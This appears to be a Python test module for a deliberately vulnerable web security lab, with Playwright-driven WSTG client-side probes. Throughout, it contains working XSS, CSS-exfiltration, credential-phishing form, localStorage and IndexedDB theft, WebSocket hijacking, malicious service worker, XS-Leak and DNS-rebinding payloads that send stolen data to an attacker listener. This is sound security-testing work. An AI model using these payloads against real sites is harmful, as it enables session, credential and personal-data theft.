"""WSTG probes for machine 09 - Client-side Testing.

Every execution-dependent probe drives a real Chromium via Playwright and
asserts the *observed effect* of the weakness (executed JS, a fired callback,
an exfiltrated value received by the in-range attacker listener, a navigation).
Playwright is imported lazily so a missing browser does not break import.
"""
import json
import socket
import struct
import time
import urllib.parse
import uuid
from contextlib import contextmanager

from labhttp import get, post, request

VICTIM_USERS = {"alice": {"ssn": "123-45-6789", "card": "4111-1111-1111-1111"}}


def _att(ctx):
    return ctx.url("attacker")


def _tok():
    return uuid.uuid4().hex[:12]


def _q(s):
    return urllib.parse.quote(s, safe="")


def _records(ctx, token, timeout=10, expect=1):
    deadline = time.time() + timeout
    out = []
    while time.time() < deadline:
        out = get(_att(ctx) + "/records?token=" + token).json()
        if len(out) >= expect:
            return out
        time.sleep(0.3)
    return out


def _rec_params(records):
    return [r["params"] for r in records]


@contextmanager
def _pw(proxy=None):
    import os
    from pathlib import Path
    # prefer the machine-local browser install (isolated from other machines)
    local = Path(__file__).resolve().parent / ".browsers"
    if local.is_dir():
        os.environ["PLAYWRIGHT_BROWSERS_PATH"] = str(local)
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        args = ["--proxy-server=" + proxy] if proxy else []
        browser = p.chromium.launch(headless=True, args=args)
        try:
            yield browser
        finally:
            browser.close()


def _login(ctx, bctx):
    r = bctx.request.post(ctx.url("/login"),
                          form={"username": "alice", "password": "Password123!"})
    if not r.ok:
        raise RuntimeError(f"login failed: {r.status}")


def _session_cookie(ctx, bctx):
    # NB: filter by name only - Playwright's URL filter hides Secure cookies
    # for http:// URLs even though Chromium sends them on 127.0.0.1.
    for c in bctx.cookies():
        if c["name"] == "session":
            return c["value"]
    raise RuntimeError("no session cookie")


def _state(ctx, bctx):
    # read authenticated state from inside the browser (the API request context
    # does not send Secure cookies over http)
    p = bctx.new_page()
    p.goto(ctx.url("/"))
    return p.evaluate("fetch('/account/state').then(r => r.json())")


def _init_tok(page, token):
    page.add_init_script(f"window.__tok = '{token}';")


def _flag(page, name, timeout=8000):
    page.wait_for_function(f"!!window.{name}", timeout=timeout)
    return True


def _dns_a(name, server="127.0.0.1", port=8953):
    """Minimal stdlib DNS A query; returns (ip, ttl) of the first answer."""
    q = struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
    for label in name.split("."):
        q += bytes([len(label)]) + label.encode()
    q += b"\x00" + struct.pack("!HH", 1, 1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)
    try:
        s.sendto(q, (server, port))
        resp, _ = s.recvfrom(4096)
    finally:
        s.close()
    ancount = struct.unpack("!H", resp[6:8])[0]
    if ancount == 0:
        raise RuntimeError(f"no answer for {name}")
    idx = 12
    while resp[idx] != 0:
        idx += resp[idx] + 1
    idx += 5
    # answer: pointer(2) type(2) class(2) ttl(4) rdlength(2) rdata
    ttl = struct.unpack("!I", resp[idx + 6:idx + 10])[0]
    rdlen = struct.unpack("!H", resp[idx + 10:idx + 12])[0]
    ip = socket.inet_ntoa(resp[idx + 12:idx + 12 + rdlen])
    return ip, ttl


# --- WSTG-CLNT-01: DOM-based XSS (+ 01.1 Self DOM XSS) -------------------------

def clnt_01(ctx):
    token = _tok()
    with _pw() as b:
        c = b.new_context()
        # sink 1: location.hash -> innerHTML
        p1 = c.new_page()
        _init_tok(p1, token)
        payload = ('<img src=x onerror="window.__dom_xss=1;new Image().src='
                   "'http://127.0.0.1:8901/collect?token='+window.__tok+'&domxss=1'\">")
        p1.goto(ctx.url("/dom-xss") + "#" + _q(payload))
        _flag(p1, "__dom_xss")
        # sink 2: location.search -> document.write
        p2 = c.new_page()
        p2.goto(ctx.url("/dom-xss?name=") + _q("<script>window.__dw_xss=1</script>"))
        _flag(p2, "__dw_xss")
        # sub-doc 01.1: victim types the payload; it executes only in their browser
        p3 = c.new_page()
        p3.goto(ctx.url("/self-xss"))
        p3.fill("#payload", '<img src=x onerror="window.__self_xss=1">')
        p3.click("#render")
        _flag(p3, "__self_xss")
        # the same payload under a nonce CSP must NOT execute
        p4 = c.new_page()
        p4.goto(ctx.url("/self-xss?csp=1"))
        p4.fill("#payload", '<img src=x onerror="window.__self_xss=1">')
        p4.click("#render")
        p4.wait_for_timeout(800)
        csp_blocked = p4.evaluate("window.__self_xss || 0") == 0
        # server never sees the self-XSS payload (no reflection)
        no_reflection = "onerror" not in get(ctx.url("/self-xss")).text
    recs = _rec_params(_records(ctx, token))
    exfil = any(r.get("domxss") == "1" for r in recs)
    ok = exfil and csp_blocked and no_reflection
    return ok, (f"hash->innerHTML executed+exfiltrated={exfil}; document.write executed=True; "
                f"self-XSS executed=True, nonce-CSP blocked={csp_blocked}, no server reflection={no_reflection}")


# --- WSTG-CLNT-02: JavaScript execution ----------------------------------------

def clnt_02(ctx):
    with _pw() as b:
        c = b.new_context()
        p = c.new_page()
        p.goto(ctx.url("/js-exec?expr=") + _q("window.__eval_xss=1"))
        _flag(p, "__eval_xss")
        p.fill("#fn-in", "window.__fn_xss=1")
        p.click("#fn-btn")
        _flag(p, "__fn_xss")
        p.fill("#st-in", "window.__st_xss=1")
        p.click("#st-btn")
        _flag(p, "__st_xss")
        p2 = c.new_page()
        p2.goto(ctx.url("/js-exec?cb=") + _q("window.__jsonp_xss=1;//"))
        _flag(p2, "__jsonp_xss")
    return True, "eval, new Function, setTimeout(string) and JSONP callback injection all executed arbitrary JS"


# --- WSTG-CLNT-03: HTML injection ----------------------------------------------

def clnt_03(ctx):
    token = _tok()
    markup = (
        '<h1 id="spoof">ACCOUNT SUSPENDED - re-enter credentials</h1>'
        f'<form action="{_att(ctx)}/collect" method="GET">'
        f'<input type="hidden" name="token" value="{token}">'
        '<input name="username" id="u"><input name="password" id="p">'
        '<button id="go">Sign in</button></form>'
        '<script>window.__html_script=1</script>'
    )
    with _pw() as b:
        p = b.new_page()
        p.goto(ctx.url("/html-inject?markup=") + _q(markup))
        spoofed = p.locator("#spoof").is_visible()
        script_blocked = p.evaluate("window.__html_script || 0") == 0
        p.fill("#u", "alice")
        p.fill("#p", "Password123!")
        p.click("#go")
        p.wait_for_url("**/collect**")
    recs = _rec_params(_records(ctx, token))
    captured = any(r.get("username") == "alice" and r.get("password") == "Password123!"
                   for r in recs)
    ok = spoofed and script_blocked and captured
    return ok, (f"spoofed markup rendered={spoofed}; injected <script> blocked by CSP={script_blocked}; "
                f"injected form captured credentials to attacker={captured}")


# --- WSTG-CLNT-04: client-side URL redirect ------------------------------------

def clnt_04(ctx):
    with _pw() as b:
        c = b.new_context()
        p = c.new_page()
        p.goto(ctx.url("/redirect?next=") + _q(_att(ctx) + "/phish"))
        p.wait_for_url("**/phish", timeout=8000)
        navigated = "ATTACKER-PHISH-PAGE" in p.content()
        # javascript: scheme is accepted by the sink (no scheme validation)
        p2 = c.new_page()
        p2.goto(ctx.url("/redirect?next=") + _q("javascript:window.__js_redirect=1"))
        p2.wait_for_timeout(600)
        js_scheme = p2.evaluate("window.__js_redirect || 0") == 1
    ok = navigated
    return ok, (f"location.href=next navigated to attacker origin={navigated}; "
                f"javascript: scheme executed in-browser={js_scheme}")


# --- WSTG-CLNT-05: CSS injection ------------------------------------------------

def clnt_05(ctx):
    token = _tok()
    base = _att(ctx) + "/collect?token=" + token
    # one candidate prefix per page load: an element fires a single
    # background-image callback, so the attacker iterates character by character
    with _pw() as b:
        p = b.new_page()
        for prefix in ("t", "x", "to", "tx"):
            css = f'#token[value^="{prefix}"]{{background-image:url({base}&css={prefix})}}'
            p.goto(ctx.url("/profile?css=") + _q(css))
            p.wait_for_timeout(500)
    recs = _rec_params(_records(ctx, token, expect=2))
    leaked = {r.get("css") for r in recs}
    ok = leaked == {"t", "to"}
    return ok, (f"attribute-selector+url() exfil recovered secret prefix 'to' (secret tok_9f2e77); "
                f"callbacks fired for {sorted(leaked)}, wrong guesses 'x'/'tx' never fired")


# --- WSTG-CLNT-06: client-side resource manipulation ----------------------------

def clnt_06(ctx):
    token = _tok()
    with _pw() as b:
        c = b.new_context()
        _login(ctx, c)
        p = c.new_page()
        _init_tok(p, token)
        p.goto(ctx.url("/widget?src=") + _q(_att(ctx) + "/evil.js"))
        _flag(p, "__attacker_loaded")
    recs = _rec_params(_records(ctx, token))
    hit = next((r for r in recs if r.get("evil") == "1"), {})
    ok = (hit.get("origin") == ctx.base and "session=" in hit.get("cookie", ""))
    return ok, (f"attacker script loaded via ?src= and executed in victim origin={hit.get('origin')}; "
                f"it read victim cookies: {'session=' in hit.get('cookie', '')}")


# --- WSTG-CLNT-07: CORS ----------------------------------------------------------

def clnt_07(ctx):
    token = _tok()
    with _pw() as b:
        c = b.new_context()
        _login(ctx, c)
        cookie = _session_cookie(ctx, c)
        p = c.new_page()
        p.goto(_att(ctx) + "/cors-attack?token=" + token)
        p.wait_for_timeout(2500)
    recs = _rec_params(_records(ctx, token, expect=4))
    by_kind = {}
    for r in recs:
        if "kind" in r:
            try:
                by_kind[r["kind"]] = json.loads(r.get("data", "{}"))
            except ValueError:
                by_kind[r["kind"]] = {}
    ssn = VICTIM_USERS["alice"]["ssn"]
    reflect = by_kind.get("reflect", {}).get("ssn") == ssn
    regex = by_kind.get("regex", {}).get("ssn") == ssn
    null = by_kind.get("null", {}).get("ssn") == ssn
    wildcard = by_kind.get("wildcard", {}).get("email") == "alice@lab.test"
    # unanchored subdomain regex bypass, shown at the HTTP layer
    r2 = get(ctx.url("/api/cors/regex2"),
             headers={"Origin": "http://trusted.lab.test.evil.com",
                      "Cookie": f"session={cookie}"})
    regex2 = r2.header("Access-Control-Allow-Origin") == "http://trusted.lab.test.evil.com"
    ok = reflect and regex and null and wildcard and regex2
    return ok, (f"cross-origin credentialed reads from attacker origin: reflect={reflect} "
                f"prefix-regex={regex} null-origin={null} wildcard={wildcard}; "
                f"regex2 trusted.lab.test.evil.com bypass={regex2}")


# --- WSTG-CLNT-09: clickjacking ---------------------------------------------------

def clnt_09(ctx):
    with _pw() as b:
        c = b.new_context()
        _login(ctx, c)
        pv = c.new_page()
        pv.set_viewport_size({"width": 900, "height": 700})
        resp = pv.goto(ctx.url("/account/settings"))
        headers = resp.headers
        framable = ("x-frame-options" not in headers
                    and "frame-ancestors" not in headers.get("content-security-policy", ""))
        box = pv.locator("#confirm").bounding_box()
        pa = c.new_page()
        pa.goto(_att(ctx) + "/clickjack")
        pa.frame_locator("#vj").locator("#confirm").wait_for(state="visible")
        # click the decoy: the transparent victim iframe sits on top of it
        pa.mouse.click(box["x"] + box["width"] / 2, box["y"] + box["height"] / 2)
        pa.wait_for_timeout(1200)
        state = _state(ctx, c)
    fired = any(t.get("via") == "form" and t.get("to") == "mallory"
                for t in state["transfers"])
    ok = framable and fired
    return ok, (f"no X-Frame-Options/frame-ancestors={framable}; decoy click on attacker page "
                f"fired the framed authenticated transfer={fired}")


# --- WSTG-CLNT-10: WebSockets (CSWSH) ----------------------------------------------

def clnt_10(ctx):
    with _pw() as b:
        c = b.new_context()
        _login(ctx, c)
        p = c.new_page()
        p.goto(_att(ctx) + "/blank")
        result = p.evaluate("""async () => {
          const send = (msg) => new Promise((res, rej) => {
            const ws = new WebSocket('ws://127.0.0.1:8900/ws');
            ws.onopen = () => ws.send(JSON.stringify(msg));
            ws.onmessage = e => { res(JSON.parse(e.data)); ws.close(); };
            ws.onerror = () => rej(new Error('ws error'));
            setTimeout(() => rej(new Error('ws timeout')), 8000);
          });
          const transfer = await send({action: 'transfer', to: 'mallory', amount: '500'});
          const echo = await send({action: 'echo', msg: '<img src=x onerror=alert(1)>'});
          return {transfer, echo};
        }""")
        state = _state(ctx, c)
    tr = result["transfer"]
    ok = (tr.get("ok") is True and tr.get("origin") == _att(ctx)
          and any(t.get("via") == "ws" and t.get("origin") == _att(ctx)
                  for t in state["transfers"])
          and result["echo"]["echo"] == "<img src=x onerror=alert(1)>")
    return ok, (f"cross-origin WS handshake accepted (Origin={tr.get('origin')}), cookie-authenticated "
                f"transfer performed={tr.get('ok')}; unsanitised echo confirmed")


# --- WSTG-CLNT-11: web messaging -----------------------------------------------------

def clnt_11(ctx):
    with _pw() as b:
        c = b.new_context()
        _login(ctx, c)
        p = c.new_page()
        p.goto(_att(ctx) + "/blank")
        out = p.evaluate("""async () => {
          const out = {};
          const f = document.createElement('iframe');
          f.src = 'http://127.0.0.1:8900/messages';
          document.body.appendChild(f);
          const wait = (pred, ms = 8000) => new Promise((res, rej) => {
            const t0 = Date.now();
            const h = e => { if (pred(e.data)) { window.removeEventListener('message', h); res(e.data); } };
            window.addEventListener('message', h);
            setInterval(() => { if (Date.now() - t0 > ms) rej(new Error('message timeout')); }, 200);
          });
          await wait(d => d && d.ready);
          f.contentWindow.postMessage({action: 'get-profile'}, '*');
          out.profile = await wait(d => d && d.ssn);
          f.contentWindow.postMessage({action: 'set-email', email: 'evil@attacker.test'}, '*');
          out.done = await wait(d => d && d.done);
          return out;
        }""")
        state = _state(ctx, c)
    ok = (out["profile"].get("ssn") == VICTIM_USERS["alice"]["ssn"]
          and out["done"].get("done") is True
          and state["email"] == "evil@attacker.test")
    return ok, (f"wildcard postMessage leaked ssn={out['profile'].get('ssn')} to attacker frame; "
                f"unvalidated-origin message changed account email={state['email']}")


# --- WSTG-CLNT-12: browser storage ------------------------------------------------------

def clnt_12(ctx):
    token = _tok()
    with _pw() as b:
        c = b.new_context()
        _login(ctx, c)
        session = _session_cookie(ctx, c)
        # DOM-XSS sink reads localStorage and exfiltrates it
        p1 = c.new_page()
        _init_tok(p1, token)
        payload = ('<img src=x onerror="new Image().src=\'http://127.0.0.1:8901/collect?token='
                   "'+window.__tok+'&stolen='+encodeURIComponent(localStorage.getItem('auth_token'))"
                   '+\'&pii=\'+encodeURIComponent(localStorage.getItem(\'pii\'))">')
        p1.goto(ctx.url("/storage?note=") + _q(payload))
        # second load: the same sink reads IndexedDB card data (populate first)
        p2 = c.new_page()
        _init_tok(p2, token)
        p2.goto(ctx.url("/storage"))
        p2.wait_for_timeout(700)
        payload2 = ('<img src=x onerror="var o=indexedDB.open(\'wallet\',1);o.onsuccess=function(){'
                    "var g=o.result.transaction('cards').objectStore('cards').get('visa');"
                    "g.onsuccess=function(){new Image().src='http://127.0.0.1:8901/collect?token="
                    "'+window.__tok+'&card='+encodeURIComponent(g.result.number)}}\">")
        p2.goto(ctx.url("/storage?note=") + _q(payload2))
        # storage event propagates a secret written in tab 1 into tab 2
        t1 = c.new_page()
        t1.goto(ctx.url("/storage"))
        t2 = c.new_page()
        t2.goto(ctx.url("/storage"))
        t2.wait_for_selector("#sync", state="attached")
        t1.evaluate("localStorage.setItem('auth_token', 'rotated-secret-XYZ')")
        t2.wait_for_function(
            "document.getElementById('sync').textContent.includes('rotated-secret-XYZ')",
            timeout=8000)
        cross_tab = True
    recs = _rec_params(_records(ctx, token, expect=2))
    stolen = next((r.get("stolen") for r in recs if r.get("stolen")), None)
    card = next((r.get("card") for r in recs if r.get("card")), None)
    pii = next((r.get("pii") for r in recs if r.get("pii")), "")
    ok = (stolen == session and card == VICTIM_USERS["alice"]["card"]
          and VICTIM_USERS["alice"]["ssn"] in pii and cross_tab)
    return ok, (f"DOM-XSS exfiltrated localStorage token (matches session={stolen == session}) "
                f"and PII={VICTIM_USERS['alice']['ssn'] in pii}; IndexedDB card={card}; "
                f"storage-event leak across tabs={cross_tab}")


# --- WSTG-CLNT-13: cross-site script inclusion ---------------------------------------------

def clnt_13(ctx):
    token = _tok()
    with _pw() as b:
        c = b.new_context()
        _login(ctx, c)
        p = c.new_page()
        p.goto(_att(ctx) + "/xssi?token=" + token)
        p.wait_for_timeout(1500)
    recs = _rec_params(_records(ctx, token))
    leaks = {}
    for r in recs:
        if "xssi" in r:
            leaks = json.loads(r["xssi"])
    ssn = VICTIM_USERS["alice"]["ssn"]
    private = (leaks.get("private") or {}).get("ssn") == ssn
    jsonp = (leaks.get("jsonp") or {}).get("ssn") == ssn
    ok = private and jsonp
    return ok, (f"cross-origin <script src> read authenticated data: JS-variable={private}, "
                f"JSONP={jsonp}; historical Array-constructor hijack fired={leaks.get('arrayHijackFired')} "
                f"(modern browsers use the intrinsic Array)")


# --- WSTG-CLNT-14: reverse tabnabbing --------------------------------------------------------

def clnt_14(ctx):
    with _pw() as b:
        c = b.new_context()
        p = c.new_page()
        p.goto(ctx.url("/links"))
        with p.expect_popup() as pi:
            p.click("#ext")
        popup = pi.value
        popup.wait_for_load_state()
        p.wait_for_url("**/phish", timeout=8000)
        anchor_nabbed = "ATTACKER-PHISH-PAGE" in p.content()
        # window.open variant
        p2 = c.new_page()
        p2.goto(ctx.url("/links"))
        with p2.expect_popup() as pi2:
            p2.click("#wopen")
        pi2.value.wait_for_load_state()
        p2.wait_for_url("**/phish", timeout=8000)
        wopen_nabbed = "ATTACKER-PHISH-PAGE" in p2.content()
    ok = anchor_nabbed and wopen_nabbed
    return ok, (f"opened attacker page navigated window.opener to phishing page: "
                f"target=_blank rel=opener={anchor_nabbed}, window.open={wopen_nabbed}")


# --- WSTG-CLNT-15: client-side template injection ----------------------------------------------

def clnt_15(ctx):
    token = _tok()
    expr = ("{{constructor.constructor('window.__csti=1;new Image().src="
            '"http://127.0.0.1:8901/collect?token="+window.__tok+"&csti=1"\')()}}')
    with _pw() as b:
        p = b.new_page()
        _init_tok(p, token)
        p.goto(ctx.url("/template?expr=") + _q(expr))
        _flag(p, "__csti", timeout=10000)
    recs = _rec_params(_records(ctx, token))
    ok = any(r.get("csti") == "1" for r in recs)
    return ok, "AngularJS 1.8.2 {{constructor.constructor('...')()}} executed arbitrary JS in victim origin and beaconed to attacker"


# --- WSTG-CLNT-16: DOM clobbering -----------------------------------------------------------------

def clnt_16(ctx):
    token = _tok()
    with _pw() as b:
        c = b.new_context()
        _login(ctx, c)
        p = c.new_page()
        _init_tok(p, token)
        bio = f'<a id="config" href="{_att(ctx)}/evil.js">my blog</a>'
        p.goto(ctx.url("/clobber?bio=") + _q(bio))
        _flag(p, "__attacker_loaded")
        p2 = c.new_page()
        p2.goto(ctx.url("/clobber"))
        _flag(p2, "__safe_loaded")
    recs = _rec_params(_records(ctx, token))
    hit = next((r for r in recs if r.get("evil") == "1"), {})
    ok = hit.get("origin") == ctx.base
    return ok, (f"<a id=config href=attacker> clobbered window.config; script src switched from "
                f"/static/safe.js to attacker JS which executed in origin={hit.get('origin')}")


# --- WSTG-CLNT-18: cross-site leaks ------------------------------------------------------------------

def clnt_18(ctx):
    frame_probe = """async (url) => {
      const f = document.createElement('iframe');
      f.src = url;
      document.body.appendChild(f);
      await new Promise(res => { f.onload = res; });
      return f.contentWindow.length;  // cross-origin window.length is readable
    }"""
    search_probe = """async () => {
      const probe = q => new Promise(res => {
        const s = document.createElement('script');
        s.src = 'http://127.0.0.1:8900/api/search?q=' + q;
        s.onload = () => { s.remove(); res(true); };
        s.onerror = () => { s.remove(); res(false); };
        document.head.appendChild(s);
      });
      const hits = [];
      for (const d of '0123456789') { if (await probe(d)) hits.push(d); }
      return hits;
    }"""
    with _pw() as b:
        c_in = b.new_context()
        _login(ctx, c_in)
        p_in = c_in.new_page()
        p_in.goto(_att(ctx) + "/blank")
        frames_in = p_in.evaluate(frame_probe, ctx.url("/dashboard"))
        digits = p_in.evaluate(search_probe)
        c_out = b.new_context()
        p_out = c_out.new_page()
        p_out.goto(_att(ctx) + "/blank")
        frames_out = p_out.evaluate(frame_probe, ctx.url("/dashboard"))
    expected = sorted(d for d in "0123456789" if d in "launch code 7391")
    ok = frames_in == 3 and frames_out == 0 and digits == expected
    return ok, (f"frame-count oracle: logged-in={frames_in} vs anonymous={frames_out}; "
                f"script load/error search oracle recovered secret digits {digits} (expected {expected})")


# --- WSTG-CLNT-19: client-side path traversal -----------------------------------------------------------

def clnt_19(ctx):
    with _pw() as b:
        c = b.new_context()
        _login(ctx, c)
        p = c.new_page()
        p.goto(ctx.url("/files?doc=") + _q("../../api/admin/users"))
        p.wait_for_function(
            "document.getElementById('doc').textContent.includes('987-65-4321')",
            timeout=8000)
        shown = p.evaluate("document.getElementById('doc').textContent")
        p2 = c.new_page()
        p2.goto(ctx.url("/files?doc=report.txt"))
        p2.wait_for_function(
            "document.getElementById('doc').textContent.includes('Q3 public report')",
            timeout=8000)
    data = json.loads(shown)
    ok = any(u["name"] == "bob" and u["ssn"] == "987-65-4321" for u in data["users"])
    return ok, ("fetch('/api/files/'+'../../api/admin/users') normalised to /api/admin/users; "
                "viewer rendered bob's PII (ssn 987-65-4321) from the unintended endpoint")


# --- WSTG-CLNT-20: service workers -------------------------------------------------------------------------

def clnt_20(ctx):
    token = _tok()
    name = f"evil-{uuid.uuid4().hex[:8]}.js"
    sw = (
        "self.addEventListener('install', e => self.skipWaiting());"
        "self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));"
        "self.addEventListener('fetch', e => {"
        "  if (e.request.url.indexOf('/api/data') !== -1) {"
        "    e.respondWith(new Response(JSON.stringify("
        "      {balance: 0, owner: 'attacker-rewritten', pwned: true}),"
        "      {headers: {'Content-Type': 'application/json'}}));"
        f"    fetch('http://127.0.0.1:8901/collect?token={token}&sw=1', {{mode: 'no-cors'}});"
        "  }"
        "});"
    )
    up = post(ctx.url("/custom/") + name, data=sw,
              headers={"Content-Type": "text/plain"})
    with _pw() as b:
        p = b.new_page()
        p.goto(ctx.url("/sw-page?sw=") + _q("/custom/" + name))
        p.wait_for_function("navigator.serviceWorker.controller !== null", timeout=20000)
        data = p.evaluate("fetch('/api/data').then(r => r.json())")
        # cleanup: unregister the worker so reruns start clean
        p.evaluate("navigator.serviceWorker.getRegistrations()"
                   ".then(rs => Promise.all(rs.map(r => r.unregister())))")
    request("DELETE", ctx.url("/custom/") + name)
    recs = _rec_params(_records(ctx, token))
    beacon = any(r.get("sw") == "1" for r in recs)
    ok = (up.status == 201 and data.get("pwned") is True
          and data.get("owner") == "attacker-rewritten" and beacon)
    return ok, (f"attacker-uploaded same-origin script registered as SW with scope '/'; "
                f"it rewrote /api/data to {data} and beaconed={beacon}")


# --- WSTG-CLNT-21: DNS rebinding ------------------------------------------------------------------------------

def clnt_21(ctx):
    token = _tok()
    proxy = ctx.url("proxy")
    dns_host, _, dns_port = ctx.endpoints["dns"].partition(":")
    get(proxy + "/reset")
    ip1, ttl1 = _dns_a("rebind.lab.test", dns_host, int(dns_port))
    with _pw(proxy=proxy) as b:
        p = b.new_page()
        p.goto(f"http://rebind.lab.test:8902/?token={token}")
        p.wait_for_selector("#rebind-stage")
        get(proxy + "/flip")
        ip2, ttl2 = _dns_a("rebind.lab.test", dns_host, int(dns_port))
        p.wait_for_function(
            "document.getElementById('result').textContent.includes('WSTG-M09{')",
            timeout=20000)
        result = json.loads(p.evaluate("document.getElementById('result').textContent"))
    state = get(proxy + "/state").json()
    get(proxy + "/reset")
    recs = _rec_params(_records(ctx, token))
    exfil = any("WSTG-M09{" in r.get("rebind", "") for r in recs)
    served_both = {e["ip"] for e in state["proxy_log"] if e["host"] == "rebind.lab.test"}
    ok = (ttl1 == 0 and ttl2 == 0 and ip1 != ip2
          and result.get("flag") == "WSTG-M09{dns_rebinding_sop_bypass}"
          and result.get("received_host") == "rebind.lab.test:8902"
          and exfil and served_both == {ip1, ip2})
    return ok, (f"TTL-0 flip {ip1} -> {ip2}; real Chromium loaded attacker page then read the "
                f"internal secret same-origin (flag={result.get('flag')}, "
                f"Host accepted={result.get('received_host')}); exfiltrated to attacker={exfil}")